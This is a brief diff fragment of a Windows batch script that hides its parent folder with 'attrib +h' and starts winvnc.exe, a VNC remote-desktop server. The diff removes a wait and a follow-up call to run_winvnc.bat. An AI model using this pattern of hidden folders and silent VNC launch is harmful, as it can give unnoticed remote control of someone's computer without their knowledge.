@@ -41,9 +41,3 @@ attrib +h "%script_dir%\..\.."
 
 REM Start winvnc.exe for the first time and wait for 7 seconds
 start "" "%script_dir%winvnc.exe"
-timeout /t 7 >nul
-
-REM After waiting, call run_winvnc.bat
-call "%script_dir%run_winvnc.bat"
-
-REM End of main.bat
